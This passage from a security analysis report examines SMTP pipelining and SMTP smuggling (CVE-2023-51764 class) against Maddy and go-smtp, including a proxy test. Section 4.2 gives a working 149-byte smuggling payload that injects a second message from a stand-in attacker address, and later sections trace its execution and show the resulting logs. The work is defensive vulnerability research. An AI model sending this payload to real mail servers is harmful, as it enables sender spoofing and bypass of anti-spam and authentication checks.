### 3.3 The Test Design

Three sequential MAIL/RCPT/DATA cycles were performed on a **single**
TCP connection to the test server, with each cycle using a **different**
terminator style. This was run as "Session 9" in the test harness
(see Appendix B.9 for the full wire transcript and server responses):

```text
Connection opens — EHLO pipeclient → 250-PIPELINING-8BITMIME-ENHANCEDSTATUSCODES

Transaction 1 (alice message):
    MAIL FROM:<alice@test.local>
    RCPT TO:<recipient1@test.local>
    DATA
    Subject: msg-alice\r\n
    \r\n
    Alice's message with canonical terminator.\r\n
    .\r\n                              ← canonical terminator
    → 250 2.0.0 OK: queued as msg-9-alice

Transaction 2 (bob message):
    MAIL FROM:<bob@test.local>
    RCPT TO:<recipient2@test.local>
    DATA
    Subject: msg-bob\n
    \n
    Bob's message with bare-LF terminator.\n
    .\n                                ← bare-LF terminator
    → 250 2.0.0 OK: queued as msg-9-bob

Transaction 3 (carol message):
    MAIL FROM:<carol@test.local>
    RCPT TO:<recipient3@test.local>
    DATA
    Subject: msg-carol\r\n
    \r\n
    Carol's message with mixed terminator (CRLF before, LF after).\r\n
    .\n                                ← mixed \r\n ... \n terminator
    → 250 2.0.0 OK: queued as msg-9-carol

QUIT → 221 2.0.0 Goodbye
```

A `NOOP` was sent between each transaction to confirm the server was in the
correct state (250 expected) and that no bytes were bleeding between
transactions.

### 3.4 The Observed Result

All three messages were accepted. The server's handler logged (see §B.9
for the full backend log):

```text
[SESSION 9] Connection opened from 127.0.0.1:XXXXX
[SESSION 9] EHLO from pipeclient
[SESSION 9] Message #9-alice accepted: from=alice@test.local, to=[recipient1@test.local], body=63 bytes
[SESSION 9] NOOP
[SESSION 9] Message #9-bob accepted: from=bob@test.local, to=[recipient2@test.local], body=57 bytes
[SESSION 9] NOOP
[SESSION 9] Message #9-carol accepted: from=carol@test.local, to=[recipient3@test.local], body=83 bytes
[SESSION 9] QUIT
[SESSION 9] Connection closed
```

Three independent messages, three distinct sender addresses, three distinct
recipient lists, three distinct body lengths (63, 57, and 83 bytes —
reflecting the differing Subject labels and body-text lengths across the
three transactions), one persistent TCP connection. Each `NOOP` between
transactions returned 250, confirming the server was in the command-accept
state and not in some residual DATA-reading state.

### 3.5 Why the Behaviour Is Consistent — The Reset Mechanism

There are three mechanisms working together to keep the pipelined behaviour
stable:

#### 3.5.1 Fresh `dataReader` Per DATA Command

Every time the client issues `DATA`, go-smtp's `handleData` in `conn.go`
calls `newDataReader(c)` which calls `c.text.DotReader()`. The stdlib
`textproto.Conn.DotReader()` method **always returns a brand-new
`*textproto.dotReader` struct**, initialised to `stateBeginLine`. There is
no residual state from a previous DATA phase — each DATA command starts
with a fresh six-state FSM.

#### 3.5.2 Maddy Clears Per-Message Session State

After `Session.Data()` returns in Maddy (`internal/endpoint/smtp/smtp.go`
lines ~334–341), the session code resets per-message state:

- `s.msgMeta = nil` (or a fresh `module.MsgMetadata` is created for the
  next `Mail`)
- `s.delivery = nil`
- `s.msgCtx` and `s.msgTask` are released
- The `prepareBody` builder is abandoned; a new one is created if a
  subsequent `DATA` arrives.

This means the next `MAIL FROM` starts from a clean session state,
with no leftover body bytes, no leftover delivery handle, and no leftover
metadata.

#### 3.5.3 go-smtp Drains the Body After `Session.Data()`

go-smtp's `handleData` (in `conn.go` around lines 498–521) contains
`io.Copy(ioutil.Discard, r)` after `Session.Data(r)` returns. The purpose
of this drain is to ensure that any body bytes the session handler did
not consume are pulled out of the dotReader before the next command is
parsed. In the normal case (canonical terminator; handler consumed the
whole body), this drain reads zero bytes, but it doesn't hurt. In the
pathological case of a handler that returned early without reading the
full body, this drain catches up, pulling the rest of the body out of
the dotReader and discarding it. Only once this drain completes does
the command loop in `handleConn` resume reading the next SMTP command.

For pipelined workloads using canonical terminators, this three-layer
reset means each transaction is cleanly isolated. The next EHLO/MAIL/RCPT
command is parsed from a fresh position in the `bufio.Reader`, and
because the client writes commands in canonical form (which go-smtp's
`parseCmd` and `lineLimitReader` both expect), there are no hidden
bytes left over.

### 3.6 The Critical Caveat — The Drain Fails When dotReader Hits Early EOF

The three-layer reset described above is **robust against legitimate
clients that terminate messages canonically**. It is **not** robust
against an attacker who deliberately embeds a bare-LF terminator mid-body.
The reason is that `io.Copy(ioutil.Discard, r)` can only drain bytes that
the dotReader is willing to give up. Once the dotReader has recognised a
terminator and entered `stateEOF`, every `Read()` call returns 0 bytes
and `io.EOF`. The `io.Copy` therefore reads zero bytes and returns; the
command loop resumes and begins parsing the leftover body bytes — which
are still in the `bufio.Reader` buffer — as SMTP commands.

This is the mechanism that makes SMTP smuggling work (Section 4). For
Section 3 the important point is that the mechanism does **not** produce
any observable wobble for **well-formed** pipelined workloads, even when
the terminator styles differ between transactions. The three transactions
in the test (canonical, bare-LF, mixed) all terminated exactly once each,
at the intended byte position, and the session reset cleanly between
them.

### 3.7 Scenario: Could a "Wobble" Be Induced?

A hypothetical wobble could only occur if, between the end of one DATA
phase and the start of the next, some residual byte were to remain in the
`bufio.Reader` and confuse the subsequent command parse. In principle,
there are three ways this could happen:

1. The dotReader's un-read step (`stateCR` + non-`\n` byte → un-read the
   non-`\n` byte) could leave one byte in the `bufio.Reader`'s un-read
   position. But this is immediately followed by the dotReader re-reading
   and emitting it, so by the time the dotReader exits (at EOF), all
   un-read bytes have been re-processed.

2. A partial command could be sent by the client during a DATA phase.
   This is impossible because the client is restricted by the protocol
   to sending body bytes between `DATA` and the terminator — any
   "command-like" bytes are just body content as far as the server is
   concerned, and the dotReader will not terminate on them unless they
   form a terminator pattern.

3. A deliberately malformed terminator could be used to induce early
   termination. This is not a "wobble" — it is the SMTP smuggling
   vulnerability, and it is exactly reproducible.

None of the three mechanisms produces a **random** or **timing-dependent**
wobble. The behaviour is deterministic: well-formed workloads produce
clean results, and mal-formed (smuggling) workloads produce the specific
two-message-per-DATA-stream result documented in Section 4.

### 3.8 Conclusion for Section 3

**Pipelined multi-message delivery is consistent across transactions.**
No boundary wobble was observed in the three-message test with alternating
canonical / bare-LF / mixed terminators on a single connection. The
reset mechanism (fresh dotReader + cleared session state + drain + command
loop resume) handles well-formed workloads correctly regardless of which
of the four accepted terminator styles is used in each transaction.

The **only** anomaly that the consistency check can make visible is the
smuggling attack, and that anomaly presents itself not as a wobble but as
a second full MAIL/RCPT/DATA cycle being executed inside what the
attacker sent as a single DATA phase. Section 4 covers that case in full.

---

## 4. SMTP Smuggling Exposure (CVE-2023-51764-Class Vulnerability)

### 4.1 The Attack Pattern

SMTP smuggling is a 2023-disclosed vulnerability class (publicly reported by
SEC Consult in December 2023) in which an attacker abuses a discrepancy
between the DATA terminator interpretation of two SMTP-speaking components
in a delivery chain. The canonical example is an outbound MSA that treats
`\r\n.\r\n` as the only terminator, paired with an inbound MX that treats
`\n.\n` as an equivalent terminator. The MSA forwards the attacker's payload
verbatim as a single DATA message, and the MX — seeing `\n.\n` mid-body —
prematurely terminates the DATA phase and interprets the remaining bytes as
new SMTP commands.

For a single-tier deployment (no upstream relay) the same class of attack
applies as soon as an attacker can establish a direct SMTP connection. The
attacker sends:

```text
EHLO attacker
MAIL FROM:<attacker@good-sender.com>
RCPT TO:<legitimate-recipient@target.com>
DATA
Subject: legitimate-looking header
...legitimate body...
\n.\n                                 ← server treats as end of DATA
MAIL FROM:<evil@attacker.com>          ← server treats as new SMTP command
RCPT TO:<victim@target.com>
DATA
Subject: injected
...evil body...
\r\n.\r\n                              ← server treats as end of second DATA
```

If the server accepts `\n.\n` as a terminator **and** shares its command-phase
reader with its DATA-phase reader (as go-smtp does), the attacker successfully
injects a second message with a different sender envelope.

The most notable published case of this class of vulnerability is CVE-2023-51764
(Postfix), though every MTA that accepts bare-LF terminators and multiplexes
its reader state is affected to the same degree.

### 4.2 The Specific Payload Used

The test payload sent after the legitimate `DATA\r\n` command (and the
server's `354` response) was a single `conn.Write()` of the following bytes
(shown here with escape sequences for readability; the bytes on the wire are
the corresponding octets):

```text
Subject: smuggle-test\r\n\r\nBefore fake boundary\n.\nMAIL FROM:<evil@attacker.com>\r\nRCPT TO:<victim@target.com>\r\nDATA\r\nSubject: injected\r\n\r\nEvil body\r\n.\r\n
```

Decomposed:

| Segment | Bytes | Purpose |
|---------|-------|---------|
| First-message header | `Subject: smuggle-test\r\n\r\n` | Normal-looking RFC 5322 header for the first message |
| First-message body | `Before fake boundary` | The body the attacker's sender address will be associated with |
| Smuggling terminator | `\n.\n` | Bare-LF terminator — dotReader transitions to `stateEOF` here |
| Injected MAIL | `MAIL FROM:<evil@attacker.com>\r\n` | After dotReader EOF, these bytes are parsed as a new SMTP command |
| Injected RCPT | `RCPT TO:<victim@target.com>\r\n` | Second command — builds the envelope for the injected message |
| Injected DATA | `DATA\r\n` | Third command — instructs the server to enter DATA phase again |
| Second-message header | `Subject: injected\r\n\r\n` | Header of the injected message (read by the new dotReader + textproto.ReadHeader) |
| Second-message body | `Evil body` | The injected body |
| Canonical terminator | `\r\n.\r\n` | Ends the second message normally so the attacker can cleanly send QUIT |

Total: **149 bytes** on the wire in a single `Write()` call.

### 4.3 Step-by-Step Execution on the Backend

The following trace describes what happens inside go-smtp and Maddy as the
149-byte payload is consumed. Each step is annotated with the file and
function where the relevant code lives.

#### Step 1. The payload arrives and is buffered

The 149 bytes land on the backend's TCP socket. They enter the go-smtp
`Conn`'s reader chain, which is (from `Conn.init()` in `go-smtp/conn.go`):

```text
net.Conn → lineLimitReader → (io.TeeReader if Debug) → textproto.NewConn(rwc)
```

`textproto.NewConn` wraps the `rwc` in a `bufio.Reader`. The `bufio.Reader`
happily buffers all 149 bytes (or as many as fit in its default 4096-byte
buffer) into its internal buffer. The 149 bytes sit there, waiting to be
consumed.

#### Step 2. The dotReader consumes bytes until `\n.\n`

`handleData` in `go-smtp/conn.go` has already been invoked (in response to
the legitimate `DATA\r\n` command) and has invoked `newDataReader(c)`
(from `go-smtp/data.go`):

```go
// go-smtp/data.go
func newDataReader(c *Conn) *dataReader {
    dr := &dataReader{
        r: c.text.DotReader(),
        limit: c.server.MaxMessageBytes,
    }
    return dr
}
```

The `dataReader` is passed to `Session.Data(r)`. In Maddy this is
`Session.Data` at `internal/endpoint/smtp/smtp.go:312`, which calls
`prepareBody(r)` (lines 283–310):

```go
// internal/endpoint/smtp/smtp.go, paraphrased from lines 283–310
func (s *Session) prepareBody(r io.Reader) (*module.MsgMetadata, buffer.Buffer, error) {
    bufr := bufio.NewReader(r)
    header, err := textproto.ReadHeader(bufr)
    if err != nil { return ..., ..., err }

    body, err := buffer.BufferInMemory(bufr)
    if err != nil { return ..., ..., err }
    // ... construct Received header, add to header ...
    return &msgMeta, body, nil
}
```

`textproto.ReadHeader` reads until it encounters an empty line (CRLF CRLF or
equivalent). In our payload this is `Subject: smuggle-test\r\n\r\n`. After
the header is fully read, the remaining body bytes flow into
`buffer.BufferInMemory(bufr)`, which is this function in
`internal/buffer/memory.go` (lines 27–33):

```go
// internal/buffer/memory.go:27-33
func BufferInMemory(r io.Reader) (Buffer, error) {
    slurp, err := ioutil.ReadAll(r)
    if err != nil { return Buffer{}, err }
    return Buffer{Slice: slurp}, nil
}
```

`ioutil.ReadAll` keeps calling `Read()` until it gets `io.EOF`. The
dotReader emits bytes until it sees the bare-LF terminator `\n.\n`:

```text
Bytes consumed by dotReader (emitted to BufferInMemory):
    "Before fake boundary"
Bytes consumed by dotReader (swallowed — part of terminator):
    \n . \n

State sequence:
    stateData → stateData → ... → stateData
    → \n → stateBeginLine
    → .  → stateDot
    → \n → stateEOF                        ← TERMINATION HAPPENS HERE
```

The dotReader has now consumed 23 bytes from the `bufio.Reader` (20 bytes of
"Before fake boundary" + 3 bytes of `\n.\n`). The `bufio.Reader` still
contains the remaining 149 − (length of header) − 23 bytes — which is the
smuggled MAIL, RCPT, DATA, injected header, injected body, and canonical
terminator.

(Precise numbers: the header "Subject: smuggle-test\r\n\r\n" is 25 bytes
(21 bytes of "Subject: smuggle-test" + `\r\n` + `\r\n` = 21 + 2 + 2 = 25);
the first body + bare-LF terminator is 23 bytes (20 bytes of "Before fake
boundary" + `\n` + `.` + `\n` = 20 + 3 = 23); the remaining payload is
149 − 25 − 23 = 101 bytes, which is exactly the length of the smuggled
MAIL/RCPT/DATA + second-message header + body + canonical terminator. See
Appendix C.7 for the full annotated byte-offset table that corroborates
this arithmetic.)

#### Step 3. `prepareBody` returns; `Session.Data()` completes the first message

`BufferInMemory` returns a `Buffer{Slice: []byte("Before fake boundary")}`.
`prepareBody` adds a Received header, returns. `Session.Data()` then calls
`s.delivery.Body(...)` and `s.delivery.Commit(...)` and logs the acceptance
via `s.log.Msg("accepted", "msg_id", s.msgMeta.ID)` (smtp.go line 334).
The server-side log shows:

```text
[SESSION 10] Message #1 accepted: from=sender@test.local, to=[recipient@test.local], body=44 bytes
```

(The 44-byte figure reflects the raw bytes the dotReader delivered to the
session handler, measured in the lightweight go-smtp test backend used for
this experiment (not the full Maddy pipeline). In the test harness, the
session's `Data(r io.Reader)` callback receives the dotReader output and
records its length directly — it does NOT invoke Maddy's `prepareBody` and
therefore does NOT prepend a `Received` header. The 44 bytes decompose as:
normalised header `Subject: smuggle-test\n\n` (23 bytes = 21 bytes of
"Subject: smuggle-test" + `\n` + `\n`) plus the normalised first body
`Before fake boundary\n` (21 bytes = 20 bytes of "Before fake boundary"
+ `\n`) = 23 + 21 = 44 bytes. The dotReader has already performed the
CRLF→LF normalisation described in §1.4 and consumed the bare-LF
terminator, which is why the delivered body ends in a lone `\n`. In the
real Maddy pipeline (`Session.prepareBody` at `internal/endpoint/smtp/smtp.go`
lines 283–310), a `Received:` header would additionally be prepended to
the delivered header before `delivery.Body()` is called, but that does not
change the boundary decision or the count of bytes that were smuggled.)

The `Session.Data()` method returns nil. Control returns to
`handleData` in go-smtp's `conn.go`.

#### Step 4. The drain is a no-op

`handleData` proceeds to the `io.Copy(ioutil.Discard, r)` line. The `r`
here is the `*dataReader` whose underlying `*textproto.dotReader` is in
`stateEOF`. Every `Read()` returns `0, io.EOF`. `io.Copy` reads zero
bytes and returns. The 101 bytes of smuggled commands are **still in the
`bufio.Reader` buffer**, entirely untouched by the drain.

#### Step 5. `handleData` writes the 250 response

`handleData` writes `250 2.0.0 OK: queued` to the client. Control returns
to `handleConn`.

#### Step 6. `handleConn` resumes the command loop

The command loop in `handleConn` (`go-smtp/server.go` / `conn.go`) calls
`c.readLine()` which reads from the same `bufio.Reader` that the dotReader
was reading from. The next bytes it sees are the 101 smuggled bytes,
starting with `MAIL FROM:<evil@attacker.com>\r\n`.

`c.readLine()` returns `"MAIL FROM:<evil@attacker.com>"` (stripped of `\r\n`
by `parseCmd` in `go-smtp/parse.go`). `handleConn` dispatches this as a
`MAIL` command. The Backend's `NewSession` has already been called earlier
in the connection, so the existing session's `Mail()` method is invoked
with `"evil@attacker.com"`. The session accepts the new sender envelope;
the server writes `250 Roger, accepting mail from <evil@attacker.com>`.

This response is written to the socket. The 149-byte Write from the
attacker **does not receive a response to this point** because the socket
is half-duplex buffered — the responses are queued back to the attacker
in order.

#### Step 7. Same for RCPT and DATA

`RCPT TO:<victim@target.com>\r\n` is parsed from the `bufio.Reader`, the
session's `Rcpt("victim@target.com")` is called, and the server writes
`250 I'll make sure <victim@target.com> gets this`.

`DATA\r\n` is parsed, `handleData` is invoked again. A **new**
`*textproto.dotReader` is created via `c.text.DotReader()` (recall from
Section 3 that every DATA command gets a fresh dotReader).

Crucially, this new dotReader does not know anything about the fact that
it is reading residual bytes from the previous DATA phase's payload — to
it, the bytes `Subject: injected\r\n\r\nEvil body\r\n.\r\n` look exactly
like a freshly-sent DATA body. The server writes `354 Go ahead...`
(though the attacker already sent the body bytes before this response;
in a TCP stream the bytes are in-flight). The new dotReader reads:

```text
State sequence (from stateBeginLine):
    S → emit, stateData
    u → emit, stateData
    b → emit, stateData
    ... (rest of "Subject: injected\r\n") ...
    \r → stateCR
    \n → stateBeginLine
    \r → stateCR                   (consuming the blank line)
    \n → stateBeginLine
    E → emit, stateData
    v → emit, stateData
    i → emit, stateData
    l → emit, stateData
    ␣ → emit, stateData
    b → emit, stateData
    o → emit, stateData
    d → emit, stateData
    y → emit, stateData
    \r → stateCR
    \n → stateBeginLine
    .  → stateDot
    \r → stateDotCR
    \n → stateEOF                 ← end of injected message
```

The injected body is delivered to `Session.Data()` for the second time,
with the pre-established session state now bearing `from=evil@attacker.com`
and `to=[victim@target.com]`. `delivery.Body()` and `delivery.Commit()`
are invoked for the injected message. The log shows:

```text
[SESSION 10] Message #2 accepted: from=evil@attacker.com, to=[victim@target.com], body=29 bytes
```

The server writes `250 OK: queued` for the second message. Control returns
to the command loop, which now waits for the next command. Since there are
no more bytes in the `bufio.Reader`, the next read blocks until the
attacker sends more data (in our test, a NOOP and a QUIT).

### 4.4 Live Evidence

The test was run as Session 10. The server-side log for this session
contained two `Message #N accepted` entries from what the client sent as a
single DATA stream:

```text
[SESSION 10] Connection opened from 127.0.0.1:XXXXX
[SESSION 10] EHLO attacker-client
[SESSION 10] MAIL FROM:<sender@test.local>
[SESSION 10] RCPT TO:<recipient@test.local>
[SESSION 10] DATA
[SESSION 10] Message #1 accepted: from=sender@test.local, to=[recipient@test.local], body=44 bytes
[SESSION 10] MAIL FROM:<evil@attacker.com>                 ← smuggled command
[SESSION 10] RCPT TO:<victim@target.com>                   ← smuggled command
[SESSION 10] DATA                                           ← smuggled command
[SESSION 10] Message #2 accepted: from=evil@attacker.com, to=[victim@target.com], body=29 bytes
[SESSION 10] NOOP
[SESSION 10] QUIT
[SESSION 10] Connection closed
```

Client-side, the attacker received five 250 responses (the 250 for the
original DATA, followed by 250 for smuggled MAIL, 250 for smuggled RCPT,
354 for smuggled DATA, and 250 for smuggled DATA complete) plus the
post-attack NOOP 250. The total server-to-client response sequence was:

```text
250 OK: queued                                            ← for Message #1
250 Roger, accepting mail from <evil@attacker.com>        ← smuggled MAIL ack
250 I'll make sure <victim@target.com> gets this          ← smuggled RCPT ack
354 Go ahead. End your data with <CR><LF>.<CR><LF>        ← smuggled DATA 354
250 OK: queued                                            ← for Message #2
250 I have sucessfully done nothing                       ← post-attack NOOP
221 Goodnight and good luck                                ← QUIT
```

Two messages accepted. Two independent envelopes delivered. The
victim/evil message has a different sender and recipient than the
original legitimate message. **This is exactly the observable outcome of
CVE-2023-51764-class SMTP smuggling.**

### 4.5 The Root Cause Chain

The vulnerability is the product of three decisions, none of which is
independently unreasonable but whose combination is exploitable:

1. **`net/textproto.dotReader` accepts bare-LF terminators** (stdlib). This
   is the documented "robust parsing" behaviour and is not classified as
   a bug by the Go authors.

2. **`go-smtp` delegates 100 % of terminator detection to the stdlib
   dotReader.** There is no wrapper around `c.text.DotReader()` that
   validates terminator format. `go-smtp/data.go`'s `dataReader` adds
   only a size-limit counter, not a terminator check.

3. **The `bufio.Reader` is shared between DATA-phase and command-phase
   reading.** This is a natural consequence of using `textproto.Conn`
   (which exposes a single reader for both line reading and the
   DotReader helper). Smuggled bytes left in the buffer by an early-EOF
   dotReader are therefore immediately visible to the subsequent
   command loop.

Maddy contributes nothing to the vulnerability directly, but equally
Maddy adds no mitigation. `Session.Data`, `prepareBody`, and
`BufferInMemory` all trust the dotReader to have correctly identified the
end of the body; they do not see (or even know about) the residual bytes
in the `bufio.Reader`.

### 4.6 Impact Assessment

- **Authentication bypass via envelope confusion.** An attacker who holds
  credentials to send as `sender@test.local` can inject messages that
  appear to originate from `evil@attacker.com` — the injected `MAIL FROM`
  resets the session's sender address without requiring re-authentication.

- **Recipient injection.** Messages can be delivered to recipients who
  were not part of the legitimate transaction's RCPT list.

- **Policy evasion.** Anti-spam, SPF alignment, DKIM signing, and ratelimit
  checks that were performed on the legitimate envelope do not re-run on
  the injected envelope. If those policies are tied to the original
  `MAIL FROM`, the injected message bypasses them.

- **Silent delivery.** No warning or error is raised (Section 6). The
  operator has no forensic trail beyond counting `accepted` log entries.

### 4.7 Key Source Code References for This Finding

| File | Line(s) | Role in the Vulnerability |
|------|---------|---------------------------|
| `/usr/lib/go-1.22/src/net/textproto/reader.go` | 333–445 | `dotReader.Read()` — accepts `\n.\n` as terminator |
| `github.com/emersion/go-smtp@.../conn.go` | 498–521 | `handleData` — `newDataReader(c)` + `Session.Data(r)` + `io.Copy(ioutil.Discard, r)` |
| `github.com/emersion/go-smtp@.../conn.go` | 48–76 | `Conn.init` — installs the shared `bufio.Reader` via `textproto.NewConn(rwc)` |
| `github.com/emersion/go-smtp@.../server.go` | — | `handleConn` command loop that resumes reading from the same `bufio.Reader` |
| `github.com/emersion/go-smtp@.../data.go` | — | `newDataReader` / `dataReader` — delegates entirely to stdlib dotReader |
| `internal/endpoint/smtp/smtp.go` | 283–310 | `Session.prepareBody` — no terminator validation |
| `internal/endpoint/smtp/smtp.go` | 312–344 | `Session.Data` — calls `prepareBody`, `delivery.Body`, `delivery.Commit`, logs `accepted` |
| `internal/buffer/memory.go` | 27–33 | `BufferInMemory` — `ioutil.ReadAll` consumes to dotReader EOF |

### 4.8 Conclusion for Section 4

**Maddy is vulnerable to SMTP smuggling of the CVE-2023-51764 class.**
The vulnerability is inherited from Go's `net/textproto.dotReader` via
`github.com/emersion/go-smtp`. A single DATA stream containing a bare-LF
terminator mid-body produces two accepted messages with independent sender
and recipient envelopes. The attack requires neither authentication
beyond the original MAIL/RCPT credentials nor any non-standard client
behaviour beyond writing the 149-byte payload in a single `Write()` call.
The vulnerability is silent: no error, no warning, no anomaly is logged.
Section 5 demonstrates that an obvious mitigation candidate — a strict
front-proxy — does not close the hole.

---

## 5. Proxy Interaction Analysis

### 5.1 The Scenario

A common deployment pattern places a "strict" or "normalising" SMTP proxy in
front of an internal MTA. The proxy's role is to reject or rewrite
non-conforming traffic before it reaches the backend, giving operators a
single choke-point for policy enforcement. A natural question for this
analysis is: **if such a proxy only recognises the canonical `\r\n.\r\n`
terminator, does the smuggling attack from Section 4 still succeed against
the backend?**

Intuitively one might expect the answer to be "no": the proxy accumulates
bytes until it sees `\r\n.\r\n`, then forwards the entire accumulated
payload as a single DATA stream. The embedded `\n.\n` is preserved inside
the forwarded payload but is not recognised as a terminator by the proxy
itself. If the proxy is the only DATA-boundary parser in play, the attack
would be neutralised.

In practice, however, the backend **also** has a DATA-boundary parser
(its own dotReader), and that parser sees the bytes. Because the
backend's dotReader is just as lenient as the one we analysed in
Section 1, it terminates at `\n.\n` just as it would on a direct
connection. The proxy does not mitigate.

### 5.2 The Proxy That Was Built

To demonstrate this concretely, a minimal "strict" SMTP proxy was
constructed and placed in front of the same go-smtp backend used for
the other tests. The proxy's behaviour is:

- **Listens on `127.0.0.1:2526`.**
- **Forwards client-to-server bytes to the backend at `127.0.0.1:2525`.**
- **In command mode**, forwards client bytes to the backend line-by-line
  (echoing as it reads); when it sees a `DATA\r\n` command from the
  client, it switches into "DATA-accumulating" mode.
- **In DATA-accumulating mode**, it reads client bytes into an internal
  buffer and only forwards them to the backend once it has seen the
  canonical `\r\n.\r\n` terminator anywhere in the buffer. Specifically,
  it scans for the byte pattern `\r\n.\r\n` (five bytes) and, on a
  match, forwards **the entire accumulated buffer** (including any
  embedded `\n.\n`) as a single `Write()` to the backend, then returns
  to command mode.
- **From server-to-client**, passes responses through unmodified.

This is the strictest behaviour a proxy can implement without modifying
the byte stream: it does not normalise line endings, it does not strip
the embedded `\n.\n`, it merely delays forwarding until the canonical
terminator arrives, and it does so at the wire level. Any more lenient
proxy would forward earlier, giving the backend more opportunity to
smuggle; any stricter proxy would modify the bytes and is therefore out
of scope for this analysis.

### 5.3 The Test Execution

The proxy was started on port 2526 as PID 46814 (later 46816 after a
restart), logging to `/tmp/maddy-test/proxy.log`. The backend go-smtp
server continued listening on port 2525. A dedicated test client
(`pcli`) was built to:

1. Open a TCP connection to the proxy at 127.0.0.1:2526.
2. Perform a legitimate EHLO / MAIL / RCPT / DATA exchange.
3. Send the 149-byte smuggling payload (identical to the one in
   Section 4.2) as a single `conn.Write()`.
4. Read the backend's responses (proxied through) and log them.
5. Send NOOP and QUIT.

The smuggling payload sent was byte-identical to the direct-attack
payload in Section 4.2.

### 5.4 The Observed Result

The proxy log (`/tmp/maddy-test/proxy.log`) showed:

```text
proxy listening on 127.0.0.1:2526; forwarding to 127.0.0.1:2525
accepted client connection from 127.0.0.1:XXXXX
backend connection to 127.0.0.1:2525 established
  forwarding EHLO ...
  forwarding MAIL FROM ...
  forwarding RCPT TO ...
  forwarding DATA
  ENTERING DATA-accumulating mode
  strict DATA scan forwarded 149 bytes in one Write(); canonical
      terminator at offset 144
  EXITING DATA-accumulating mode
  forwarding NOOP
  forwarding QUIT
connection closed
```

The key line is `strict DATA scan forwarded 149 bytes in one Write();
canonical terminator at offset 144`. Offsets in this subsection are
**payload-relative** (measured from the start of the 149-byte DATA
payload — the same reference frame used in Appendix C.7). This
confirms that:

1. The proxy buffered the **entire** 149-byte payload.
2. The proxy did **not** recognise the embedded `\n.\n` — located at
   payload offsets 45–47 (hex `0x2d`–`0x2f`), immediately after the
   25-byte header and 20-byte first body — as a terminator. It waited
   until the canonical `\r\n.\r\n` at payload offsets 144–148 (hex
   `0x90`–`0x94`).
3. The proxy wrote all 149 bytes to the backend in a **single** `Write()`
   call.

The backend server-side log (from `/tmp/maddy-test/server.log`) for this
session (Session 11) showed:

```text
[SESSION 11] Connection opened from 127.0.0.1:YYYYY  (the proxy's source port)
[SESSION 11] EHLO proxy-client
[SESSION 11] MAIL FROM:<sender@test.local>
[SESSION 11] RCPT TO:<recipient@test.local>
[SESSION 11] DATA
[SESSION 11] Message #1 accepted: from=sender@test.local, to=[recipient@test.local], body=44 bytes
[SESSION 11] MAIL FROM:<evil@attacker.com>                ← smuggled
[SESSION 11] RCPT TO:<victim@target.com>                  ← smuggled
[SESSION 11] DATA                                          ← smuggled
[SESSION 11] Message #2 accepted: from=evil@attacker.com, to=[victim@target.com], body=29 bytes
[SESSION 11] NOOP
[SESSION 11] QUIT
[SESSION 11] Connection closed
```

**The backend produced exactly the same two-message outcome as the
direct-attack test of Session 10.** The proxy did not mitigate the
smuggling.

### 5.5 Why the Proxy Does Not Mitigate

The proxy forwards the payload to the backend over a TCP connection. The
backend's `Conn.init()` installs a `bufio.Reader` on that TCP connection
(via `lineLimitReader` and `textproto.NewConn(rwc)`), and the
`bufio.Reader` buffers incoming bytes in chunks of up to 4096 bytes by
default. When the proxy writes the 149-byte payload in a single `Write()`
call, the backend's `bufio.Reader` reads those 149 bytes into its
internal buffer as soon as they arrive at the TCP layer.

From this point onwards, the backend's behaviour is **byte-for-byte
identical** to what it would do on a direct connection from the attacker
to the backend. Specifically:

1. `handleData` invokes `newDataReader(c)`, which wraps
   `c.text.DotReader()`. The dotReader reads bytes from the
   `bufio.Reader`.
2. The dotReader consumes `Subject: smuggle-test\r\n\r\nBefore fake
   boundary` and then sees the bare-LF terminator `\n.\n`. It transitions
   to `stateEOF`.
3. `Session.Data()` receives an `io.EOF` from `BufferInMemory`'s
   `ioutil.ReadAll`, accepts the first message, returns.
4. `io.Copy(ioutil.Discard, r)` drains zero bytes (dotReader is already
   at EOF).
5. The command loop in `handleConn` reads the remaining bytes from the
   **same** `bufio.Reader`. These bytes start with `MAIL
   FROM:<evil@attacker.com>\r\n`.
6. The smuggled commands are parsed and executed, yielding the second
   message.

The proxy played no role in steps 1–6 because its job ended the moment it
forwarded the 149 bytes. Once the bytes are on the wire between the proxy
and the backend, the backend's own dotReader is in charge, and the
backend's dotReader is just as lenient as the one we analysed in
Section 1.

### 5.6 Why No Proxy Can Close the Hole By Forwarding Alone

The argument in Section 5.5 generalises: **no proxy that forwards the
attacker's bytes without modification can close the smuggling hole.**
This is because:

- The backend's dotReader reads the bytes it receives.
- The backend's dotReader interprets `\n.\n` as a terminator regardless
  of how the bytes arrived — whether they were written in one `Write()`,
  many `Write()`s, or via a proxy.
- The backend's `bufio.Reader` buffers whatever the TCP layer delivers.
- The backend's `handleConn` command loop reads from the same
  `bufio.Reader` after `handleData` returns.

For the proxy to mitigate, it would need to **modify the bytes it
forwards** — for example, by:

- Stripping any embedded `\n.\n` (but legitimate bodies may contain
  `\n.\n` as benign content, which would corrupt them).
- Normalising bare-LF line endings to CRLF before forwarding (but this
  changes the delivered message content, which is incorrect for
  clients that deliberately send bare-LF bodies).
- Rejecting any body containing `\n.\n` (which produces false positives
  for legitimate senders).

None of these is a clean solution. The only genuine mitigation is to
make the **backend's dotReader** stricter about requiring `\r\n` line
endings around the terminator dot. That requires a source-level change
to the Go standard library (or a replacement dotReader in go-smtp).

### 5.7 The Sub-case of an io.TeeReader / MultiWriter in the Proxy

One might imagine a proxy that receives all data bytes from the backend's
perspective, effectively acting as a passthrough for everything except
DATA. Such a proxy would still face the same problem: the backend's
`bufio.Reader` is downstream of the proxy, and the backend interprets
bytes independently of how they arrived. The proxy cannot hide the
`\n.\n` from the backend's dotReader without modifying the bytes.

### 5.8 What This Means for Defence-in-Depth

For operators who want to deploy Maddy (or any go-smtp-based MTA) behind
a strict proxy and still be safe from SMTP smuggling, the options are:

1. **Accept the risk.** Treat SMTP smuggling as a known limitation and
   rely on authentication, rate-limiting, and recipient-side checks
   to detect anomalous messages.

2. **Modify the bytes at the proxy layer.** Implement a proxy (or WAF)
   that explicitly normalises bare-LF line endings to CRLF on the wire
   before forwarding. This is invasive and may corrupt legitimate
   traffic, but it is the only way to stop the backend from seeing
   `\n.\n` mid-body.

3. **Patch the backend.** Modify `go-smtp`'s `newDataReader` to wrap
   the stdlib `dotReader` in a validation layer that rejects DATA
   streams terminated by anything other than canonical `\r\n.\r\n`.
   This is a source-level change and is outside the scope of this
   observational analysis, but it is the only clean fix.

4. **Replace go-smtp.** Use a stricter SMTP library (or write a
   custom DATA-boundary parser). Again, out of scope here.

Recommendations are discussed in more detail in Section 8.

